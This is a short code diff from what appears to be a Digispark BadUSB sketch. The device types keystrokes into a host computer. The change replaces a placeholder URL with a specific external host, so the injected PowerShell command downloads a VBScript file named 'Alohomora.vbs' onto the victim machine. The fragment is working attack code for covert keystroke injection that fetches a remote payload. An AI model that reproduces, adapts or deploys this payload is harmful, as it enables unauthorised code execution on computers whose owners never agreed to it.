@@ -15,7 +15,7 @@ void loop() {
   DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(300);
-  DigiKeyboard.print("$WebClient.DownloadFile('https://yoururl.com/your.vbs','your.vbs')");
+  DigiKeyboard.print("$WebClient.DownloadFile('https://bksec.xyz/github/Alohomora.vbs','Alohomora.vbs')");
   DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(300);
